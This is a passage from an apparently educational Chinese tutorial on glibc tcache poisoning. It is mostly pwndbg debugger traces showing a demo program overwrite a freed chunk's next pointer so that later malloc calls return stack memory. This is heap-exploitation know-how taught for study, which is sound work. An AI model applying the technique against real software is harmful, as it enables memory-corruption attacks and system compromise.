<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">25</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x777265766f206557</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">We</span> <span class="no">overw</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x8500000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554872</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x555555554867</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486b</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">273</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">277</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">rdx</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554872</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x555555554877</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">285</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555487c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">290</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
   <span class="err">24</span> 
 <span class="err">?</span> <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span> <span class="nf">rdx</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
</code></pre></div>
此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 <code>malloc(128)</code> 即可控制栈上的空间。</p>
<p>第一次 malloc
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">1</span><span class="nf">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="mi">0x555555756260</span>
<span class="err">26</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x20</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7ffff7dd48b0</span> <span class="p">(</span><span class="no">_IO_stdfile_2_lock</span><span class="p">)</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x6c6c616d20747331</span> <span class="p">(</span><span class="err">&#39;</span><span class="mi">1</span><span class="no">st</span> <span class="no">mall</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x2000000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x55555555489a</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">320</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007bf</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x55555555489a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">320</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007bf</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x5555555548a1</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">327</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548a5</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">331</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x234</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548ac</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">338</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548af</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">341</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x5555555548b4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">346</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
